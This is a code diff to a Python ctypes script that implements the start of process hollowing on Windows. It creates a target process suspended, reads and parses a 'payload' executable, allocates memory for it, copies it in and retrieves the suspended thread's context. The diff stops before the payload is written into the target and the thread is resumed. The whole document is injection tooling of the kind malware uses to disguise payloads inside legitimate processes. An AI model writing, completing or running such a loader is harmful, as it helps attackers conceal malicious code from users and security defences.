@@ -1,4 +1,5 @@
 import argparse
+import sys
 from ctypes import *
 
 from pefile import PE
@@ -95,20 +96,65 @@ if __name__ == "__main__":
 
     CREATE_SUSPENDED = 0x0004
 
-    if windll.kernel32.CreateProcessW(
-            None,
-            args.d,
-            None,
-            None,
-            False,
-            CREATE_SUSPENDED,
-            None,
-            None,
-            byref(si),
-            byref(pi)):
-        err = windll.kernel32.GetLastError()
-        hProcess = pi.hProcess
-        hThread = pi.hThread
+    ret = windll.kernel32.CreateProcessW(None, args.d, None, None, False,
+                                         CREATE_SUSPENDED, None, None,
+                                         byref(si), byref(pi))
 
-        print(f"Last error {err}")
-        print(f"New suspended process: {pi.dwProcessId}")
+    if not ret:
+        print("Couldn't create process")
+        err = windll.kernel32.GetLastError()
+        print(f"Error: {err}")
+        sys.exit(err)
+
+    err = windll.kernel32.GetLastError()
+    hProcess = pi.hProcess
+    hThread = pi.hThread
+
+    print(f"Last error {err}")
+    print(f"New suspended process: {pi.dwProcessId}")
+
+    with open(args.p, "rb") as payload_fh:
+        # read the payload file
+        payload_data = payload_fh.read()
+
+    payload_size = len(payload_data)
+
+    # parse payload PE header
+    payload = PE(data=payload_data)
+    payload_ImageBase = payload.OPTIONAL_HEADER.ImageBase
+    payload_SizeOfImage = payload.OPTIONAL_HEADER.SizeOfImage
+    payload_SizeOfHeaders = payload.OPTIONAL_HEADER.SizeOfHeaders
+    payload_sections = payload.sections
+    payload_NumberOfSections = payload.FILE_HEADER.NumberOfSections
+    payload_AddressOfEntryPoint = payload.OPTIONAL_HEADER.AddressOfEntryPoint
+    payload.close()
+
+    MEM_COMMIT = 0x1000
+    MEM_RESERVE = 0x2000
+    PAGE_READWRITE = 0x4
+
+    # allocate memory for the payload
+    payload_data_pointer = windll.kernel32.VirtualAlloc(None,
+                                                        c_int(payload_size + 1),
+                                                        MEM_COMMIT | MEM_RESERVE,
+                                                        PAGE_READWRITE)
+
+    if not payload_data_pointer:
+        print("Failed to allocate memory")
+        err = windll.kernel32.GetLastError()
+        print(f"Error: {err}")
+        sys.exit(err)
+
+    # load the payload data into memory
+    memmove(payload_data_pointer, payload_data, payload_size)
+
+    # get thread context
+    cx = CONTEXT()
+    cx.ContextFlags = 0x1007
+
+    if windll.kernel32.GetThreadContext(hThread, byref(cx)) == 0:
+        err = windll.kernel32.GetLastError()
+
+        print("Failed to get thread context")
+        print(f"Error: {err}")
+        sys.exit(err)
